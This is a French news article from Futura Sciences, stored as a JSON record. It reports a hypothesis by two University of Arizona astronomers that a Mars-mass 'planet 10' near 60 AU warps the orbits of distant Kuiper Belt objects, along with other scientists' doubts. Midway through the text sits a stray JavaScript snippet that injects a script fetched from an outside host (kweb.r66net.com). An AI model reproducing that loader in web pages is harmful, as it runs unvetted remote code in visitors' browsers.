{"title": "Planete 10 : notre Systeme solaire cacherait une dixieme planete !", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-06-23", "content": "En etudiant les plans orbitaux de plusieurs objets de la ceinture de Kuiper situes a plus de 50 fois la distance entre la Terre et le Soleil, des chercheurs ont constate des anomalies quant a leur inclinaison moyenne. Pour eux, la seule explication valable est qu'une planete d'une masse comprise entre celle de Mars et celle de la Terre soit a l'origine de cette deformation. Alors, la planete 10 existe-t-elle ? Ce qu'il faut retenir Dans la ceinture de Kuiper, l'inclinaison du plan orbital d'objets eloignes differe par rapport aux predictions. Deux chercheurs proposent qu'une planete de la masse de Mars soit a l'origine de ce phenomene, et il ne s'agirait pas de l'hypothetique planete 9. Pourtant, si la planete 10 existe, pourquoi ne l'avons-nous toujours pas debusquee ?   Des chercheurs ont realise des calculs en se basant sur des observations d'objets de la frange la plus lointaine de la  ceinture de Kuiper  (cet anneau de petits corps, restes de la formation de notre  Systeme solaire , s'etend au-dela de  Neptune ). Resultat : selon eux, une planete de la  masse  de  Mars  perturberait l' orbite  de ces objets. Il ne s'agit pas la de l' hypothetique planete 9 , dont l'existence a ete proposee en 2016 par Mike Brown et Konstantin Batygin, mais d'une autre encore : la planete 10. Enfin... une possible planete 10. Pour l'instant, personne ne l'a vue. Pour les auteurs de ces recherches a paraitre dans  The Astronomical Journal  (il s'agit de Kathryn Volk et Renu Malhotra, de l'universite de l'Arizona), cette planete se cacherait quelque part a environ 60  UA  du  Soleil . Son influence gravitationnelle serait suffisante pour expliquer l'inclinaison moyenne du plan orbital des objets de la  ceinture de Kuiper  les plus eloignes parmi les 600 etudies. Selon les predictions, dans l'ensemble, au-dela de 50 fois la distance Terre-Soleil (soit 50 UA), les plans orbitaux des KBO (les objets de la ceinture de Kuiper sont appeles KBO, pour  Kuiper Belt Objects , en anglais) devraient etre, en moyenne, proches du plan dit invariable des planetes du Systeme solaire. Or, les chercheurs ont constate une difference de 8deg. Certes,  << il existe une gamme d'incertitudes pour la deformation mesuree, mais il n'y a pas plus de 1 a 2 % de chance que cela soit simplement un hasard statistique de l'echantillon restreint d'observations de KBO >>,  ont commente les chercheurs. Voir aussi : La neuvieme planete : les raisons d'y croire Sur cette illustration, ou la taille des planetes est volontairement exageree, l'hypothetique planete 10 (au premier plan) a le plan de son orbite incline par rapport aux huit autres planetes situees plus pres du Soleil (au centre). En arriere-plan, on distingue le plan de notre galaxie, la Voie lactee. (c) Heather Roper,  Lunar and Planetary Laboratory ,  University of Arizona                               Beaucoup d'interrogations autour de cette hypothetique dixieme planete Que la fameuse et tres recherchee  planete 9  (aussi appelee  planete X ) soit melee a la modification des plans orbitaux de ces KBO est une possibilite eliminee par les deux astronomes. Elle n'a pas le profil : sa masse est estimee a 10 fois celle de la  Terre  et  << [elle] est trop loin pour influencer ces KBO [elle est situee entre 500 et 700 UA,  NDLR ]. [Le candidat] doit etre certainement beaucoup plus proche que 100 UA >> . En revanche, ils n'excluent pas qu'il s'agisse en fait de plusieurs objets planetaires.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Systeme solaire : deux superterres au-dela de Pluton ? Autrement, une alternative pourrait etre que ces perturbations aient ete provoquees dans le passe par le  passage d'une etoile dans le voisinage de notre Systeme solaire . Mais les auteurs n'y croient pas. Il aurait fallu alors que l'intrus soit passe au minimum a 100 UA du Soleil et, en outre, son influence aurait disparu en une dizaine de millions d'annees. Mais alors, si la planete 10 existe, pourquoi ne l'avons-nous toujours pas debusquee ?  << Tres probablement parce que nous n'avons pas encore cherche dans tout le ciel des objets distants du Systeme solaire >> , repondent les chercheurs. Pour eux, la meilleure cachette est le plan de notre  galaxie , la  Voie lactee  (en arriere-plan). Les etoiles y pullulent et il serait facile pour un objet, qui plus est sombre et froid, de se cacher... Pour l'instant, certains de leurs collegues sont dans l'incertitude.  << J'ai des doutes sur le fait qu'une planete si proche et si brillante ait pu rester inapercue >>,  a indique Alessandro Morbidelli (observatoire de la Cote d'Azur) interroge par  New Scientist . Konstantin Batygin ( California Institute of Technology ), quant a lui, a declare :  << C'est une idee interessante qui merite attention >> . Affaire a suivre donc... ", "theme": "sciences"}